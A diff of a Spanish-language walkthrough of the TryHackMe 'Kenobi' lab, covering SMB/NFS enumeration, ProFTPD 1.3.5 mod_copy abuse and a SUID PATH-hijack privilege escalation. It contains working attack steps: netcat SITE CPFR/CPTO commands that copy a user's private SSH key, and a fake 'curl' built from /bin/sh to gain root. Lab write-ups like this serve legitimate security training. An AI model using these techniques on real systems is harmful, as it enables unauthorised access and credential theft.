@@ -13,24 +13,7 @@ ok
 nmap -sV -v 10.10.207.144
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 11:53 CDT
 NSE: Loaded 46 scripts for scanning.
-Initiating Ping Scan at 11:53
-Scanning 10.10.207.144 [2 ports]
-Completed Ping Scan at 11:53, 0.19s elapsed (1 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 11:53
-Completed Parallel DNS resolution of 1 host. at 11:53, 0.04s elapsed
-Initiating Connect Scan at 11:53
-Scanning 10.10.207.144 [1000 ports]
-Discovered open port 22/tcp on 10.10.207.144
-Discovered open port 139/tcp on 10.10.207.144
-Discovered open port 21/tcp on 10.10.207.144
-Discovered open port 111/tcp on 10.10.207.144
-Discovered open port 445/tcp on 10.10.207.144
-Discovered open port 80/tcp on 10.10.207.144
-Increasing send delay for 10.10.207.144 from 0 to 5 due to 62 out of 205 dropped probes since last increase.
-Discovered open port 2049/tcp on 10.10.207.144
-Completed Connect Scan at 11:53, 18.77s elapsed (1000 total ports)
-Initiating Service scan at 11:53
-Scanning 7 services on 10.10.207.144
+ 
 Completed Service scan at 11:54, 12.60s elapsed (7 services on 1 host)
 NSE: Script scanning 10.10.207.144.
 Initiating NSE at 11:54
@@ -58,8 +41,23 @@ Nmap done: 1 IP address (1 host up) scanned in 33.42 seconds
 
 ## Task 2 Enumerating Samba for shares
 
-### Once you're connected, list the files on the share. What is the file can you see?
-- listar los shares con nmap
+Samba es el paquete estándar de programas de interoperabilidad de Windows para Linux y Unix. Permite a los usuarios finales acceder y utilizar archivos, impresoras y otros recursos compartidos en la intranet o internet de una empresa. Se le suele denominar sistema de archivos de red.
+
+Samba se basa en el protocolo cliente-servidor común, el Bloque de Mensajes del Servidor ( SMB ). SMB está desarrollado exclusivamente para Windows; sin Samba, otras plataformas informáticas quedarían aisladas de las máquinas Windows, incluso si formaran parte de la misma red.
+
+Usando nmap podemos enumerar una máquina para compartir SMB.
+
+Nmap puede automatizar diversas tareas de red. ¡Incluye un script para enumerar recursos compartidos!
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.112.187
+
+SMB tiene dos puertos, 445 y 139.
+
+### Using the nmap command above, how many shares have been found?
+3
+
+#### Usar nmap para listar las shares
+
 ```
 nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.207.144 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 11:58 CDT
@@ -101,8 +99,9 @@ Nmap done: 1 IP address (1 host up) scanned in 28.81 seconds
 
 ```
 
+### otra forma con `smbclient`
 ```
-smbclient -L //10.10.207.144
+smbclient -L 10.10.207.144
 Password for [WORKGROUP\kali]:
 
         Sharename       Type      Comment
@@ -118,7 +117,14 @@ Reconnecting with SMB1 for workgroup listing.
         Workgroup            Master
         ---------            -------
         WORKGROUP            KENOBI
+
 ```
+
+
+### Once you're connected, list the files on the share. What is the file can you see?
+
+
+#### Conectarme a la carpeta compartida y listar archivos
 
 ```
 smbclient //10.10.207.144/anonymous
@@ -136,22 +142,57 @@ smb: \> exit
 
 ```
 
+#### Puedo obtener los archivos también con `smbget`
 
-- datos en log.txt
+- Podemos descargar recursivamente los archivos en la carpeta compartida
+
 ```
+┌──(kali㉿kali)-[~/tmp/tryhackme/kenobi]
+└─$ smbget --recursive smb://10.10.112.187/anonymous
+Password for [WORKGROUP\kali]:
+Using domain: WORKGROUP, user: kali
+smb://10.10.112.187/anonymous/log.txt                                                                        
+Downloaded 11.95kB in 4 seconds
+                                                                                                             
+┌──(kali㉿kali)-[~/tmp/tryhackme/kenobi]
+└─$ ls
+log.txt  nmap
+                                                                                                
+```
+
+#### Mostramos la info en `log.txt`
+
+Abra el archivo en el recurso compartido. Se encontraron algunas cosas interesantes.
+
+- Información generada para Kenobi al generar una clave SSH para el usuario
+- Información sobre el servidor ProFTPD.
+- tenemos los datos de un usuario y contraseña
+
+```
+head -n60 log.txt
+
 # Set the user and group under which the server will run.
 User				kenobi
 Group				kenobi
 ```
 
+
 ### What port is FTP running on?
+
+21
+
 ```
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         ProFTPD 1.3.5
 ```
 
-21
+El escaneo de puertos de nmap anterior mostró el puerto 111 ejecutando el servicio rpcbind. Este es un servidor que convierte el número de programa de llamada a procedimiento remoto (RPC) en direcciones universales. Al iniciar un servicio RPC, le indica a rpcbind la dirección en la que está escuchando y el número de programa RPC que está listo para servir. 
+
+En nuestro caso, el puerto 111 da acceso a un sistema de archivos de red. Usemos nmap para enumerarlo.
+
 ### What mount can we see?
+/var
+#### Mostramos las carpetas compartidas con `nmap` scripts
 
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.249.9
@@ -182,43 +223,8 @@ PORT    STATE SERVICE
 |_  /var        9204224.0  1836544.0  6877084.0  22%   16.0T        32000
 
 Nmap done: 1 IP address (1 host up) scanned in 4.30 seconds
-                                                                
-
 ```
-
-```
-rpcinfo -p 10.10.207.144
-   program vers proto   port  service
-    100000    4   tcp    111  portmapper
-    100000    3   tcp    111  portmapper
-    100000    2   tcp    111  portmapper
-    100000    4   udp    111  portmapper
-    100000    3   udp    111  portmapper
-    100000    2   udp    111  portmapper
-    100005    1   udp  41872  mountd
-    100005    1   tcp  59447  mountd
-    100005    2   udp  56638  mountd
-    100005    2   tcp  50691  mountd
-    100005    3   udp  37556  mountd
-    100005    3   tcp  58271  mountd
-    100003    2   tcp   2049  nfs
-    100003    3   tcp   2049  nfs
-    100003    4   tcp   2049  nfs
-    100227    2   tcp   2049  nfs_acl
-    100227    3   tcp   2049  nfs_acl
-    100003    2   udp   2049  nfs
-    100003    3   udp   2049  nfs
-    100003    4   udp   2049  nfs
-    100227    2   udp   2049  nfs_acl
-    100227    3   udp   2049  nfs_acl
-    100021    1   udp  47770  nlockmgr
-    100021    3   udp  47770  nlockmgr
-    100021    4   udp  47770  nlockmgr
-    100021    1   tcp  38069  nlockmgr
-    100021    3   tcp  38069  nlockmgr
-    100021    4   tcp  38069  nlockmgr
-
-```
+#### Otra forma de mostrar  es con `showmount`
 
 ```
 showmount -e 10.10.207.144
@@ -226,18 +232,22 @@ Export list for 10.10.207.144:
 /var *
 ```
 
-/var
 
 ##  Task 3 Gain initial access with ProFtpd
-Proftpd
+ 
 
 ### What is the version?
 ```
 21/tcp   open  ftp         ProFTPD 1.3.5
 ```
 
-### How many exploits are there for the ProFTPd running?
+Podemos utilizar searchsploit para encontrar exploits para una versión particular de software.
 
+Searchsploit es básicamente una herramienta de búsqueda de línea de comandos para exploit-db.com.
+### How many exploits are there for the ProFTPd running?
+4
+
+#### Buscamos los exploits con `searchsploit`
 ```
 searchsploit ProFTPD 1.3.5
 -------------------------------------------------------- ---------------------------------
@@ -249,17 +259,35 @@ ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py
 ProFTPd 1.3.5 - File Copy                               | linux/remote/36742.txt
 -------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
+```
+
+Deberías haber encontrado un exploit del [módulo mod_copy](http://www.proftpd.org/docs/contrib/mod_copy.html) de ProFtpd . 
+
+El módulo mod_copy implementa los comandos **SITE CPFR** y **SITE CPTO** , que permiten copiar archivos/directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede usar estos comandos para copiar archivos desde cualquier  parte del sistema de archivos a un destino seleccionado.
+
+#### Vemos la información del exploit `searchsploit -x`
+
+```
+searchsploit -x 36742.txt 
+
+Trying 80.150.216.115...
+Connected to 80.150.216.115.
+Escape character is '^]'.
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
+site help
+214-The following SITE commands are recognized (* =>'s unimplemented)
+
+214-CPFR <sp> pathname
+214-CPTO <sp> pathname
 
 ```
 
-4
+Sabemos que el servicio FTP se está ejecutando como el usuario Kenobi (desde el archivo en el recurso compartido) y se genera una clave ssh para ese usuario.
 
-### We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 
+Ahora vamos a copiar  la clave privada de Kenobi usando los comandos SITE CPFR y SITE CPTO.
 
+#### Copiar la llave privada, usando la info para explotar la vulnerabilidad
 
-### We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
-
-- copiamos la llave privada
 ```
 nc 10.10.207.144 21                                               
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.144]
@@ -271,10 +299,17 @@ SITE CPTO /var/tmp/id_rsa
 
 ```
 
-- montamos la share y la copiamos
+Sabíamos que el directorio /var era un montaje visible (tarea 2, pregunta 4). Por lo tanto, hemos movido la clave privada de Kenobi al directorio /var/tmp.
+
+#### montamos la share y la copiamos
+
+- creamos un directorio para el montaje y montamos, luego listamos para ver que se haya montado
+
 ```
 sudo mkdir /mnt/kenobi
+
 sudo mount 10.10.207.144:/var /mnt/kenobi
+
 ls -la /mnt/kenobi/  
 total 56
 drwxr-xr-x 14 root root  4096 Sep  4  2019 .
@@ -296,7 +331,7 @@ drwxr-xr-x  3 root root  4096 Sep  4  2019 www
 
 ```
 
-- copiamos la lleve, cambiamos permisos y usamos
+### copiamos la lleve, cambiamos permisos y usamos
 ```
 cp /mnt/kenobi/tmp/id_rsa .
 
@@ -349,7 +384,24 @@ kenobi@kenobi:~$
 
 ###  Task 4 Privilege Escalation with Path Variable Manipulation
 
+Primero entendamos qué son SUID, SGID y Sticky Bits.
+
+|             |                                                                              |                                                                           |
+| ----------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
+| **Permiso** | **En archivos**                                                              | **Sobre los directorios**                                                 |
+| Bit SUID    | El usuario ejecuta el archivo con los permisos del propietario del _archivo_ | -                                                                         |
+| Bit SGID    | El usuario ejecuta el archivo con el permiso del propietario _del grupo_ .   | El archivo creado en el directorio obtiene el mismo propietario de grupo. |
+| Sticki Bit  | Sin significado                                                              | A los usuarios se les impide eliminar archivos de otros usuarios.         |
+Los bits SUID pueden ser peligrosos, algunos binarios como passwd necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.
+
+Para buscar este tipo de archivos en un sistema, ejecute lo siguiente: 
+
+find / -perm -u=s -type f 2>/dev/null
+
 ### What file looks particularly out of the ordinary? 
+
+/usr/bin/menu
+
 ```
 find / -perm -u=s -type f 2>/dev/null
 
@@ -386,9 +438,14 @@ find / -user root -perm /4000 2>/dev/nul
 /bin/ping6
 ```
 
-/usr/bin/menu
+
 
 ### Run the binary, how many options appear?
+
+3
+#### Ejecutamos el binario
+
+- Al ejecutar el binario nos aparecen 3 opciones
 
 ```
 /usr/bin/menu
@@ -410,16 +467,84 @@ Content-Type: text/html
 
 ```
 
-3
+#### Comprobamos las opciones del menu
+
+```
+kenobi@kenobi:~$ /usr/bin/menu 
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+HTTP/1.1 200 OK
+Date: Fri, 28 Mar 2025 17:22:36 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html
+
+kenobi@kenobi:~$ /usr/bin/menu 
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :2
+4.8.0-58-generic
+kenobi@kenobi:~$ /usr/bin/menu 
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :3
+eth0      Link encap:Ethernet  HWaddr 02:87:9f:d2:14:9d  
+          inet addr:10.10.112.187  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::87:9fff:fed2:149d/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:3134 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:3048 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:299414 (299.4 KB)  TX bytes:420952 (420.9 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:234 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:234 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:16741 (16.7 KB)  TX bytes:16741 (16.7 KB)
+
+```
+
+#### Hacemos un strings al binario para ver que encontramos
+
+- Ejecuta los comandos curl, uname -r, ifconfig
 
 ```
 strings -n 10 /usr/bin/menu 
+
 /lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
 __isoc99_scanf
+puts
 __stack_chk_fail
+printf
+system
 __libc_start_main
 __gmon_start__
+GLIBC_2.7
+GLIBC_2.4
 GLIBC_2.2.5
+UH-`
+AWAVA
+AUATL
 []A\A]A^A_
 ***************************************
 1. status check
@@ -427,25 +552,46 @@ GLIBC_2.2.5
 3. ifconfig
 ** Enter your choice :
 curl -I localhost
+uname -r
+ifconfig
+
 
 ```
 
-### We copied the /bin/sh shell, called it curl,
+Esto nos muestra que el binario se está ejecutando sin una ruta completa (por ejemplo, no utiliza /usr/bin/curl o /usr/bin/uname).
+
+Como este archivo se ejecuta con privilegios de usuario root, podemos manipular nuestra ruta para obtener un shell root
+
+#### Copiamos /bin/sh como curl en la carpeta temporal y modificamos la ruta
+
+- Copiamos
 
 ```
 kenobi@kenobi:~$ cd /tmp
 kenobi@kenobi:/tmp$ echo /bin/sh > curl
 kenobi@kenobi:/tmp$ chmod 777 curl
 kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+```
 
+- Modificamos la ruta
+```
 echo $PATH
-/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
+/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+export PATH=/tmp:$PATH
+echo $PATH
+
+/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
 
 ```
 
 ### What is the root flag (/root/root.txt)?
+
+
+#### Ahora invocamos al menu para tener el root
+
 ```
 kenobi@kenobi:/tmp$ /usr/bin/menu 
 
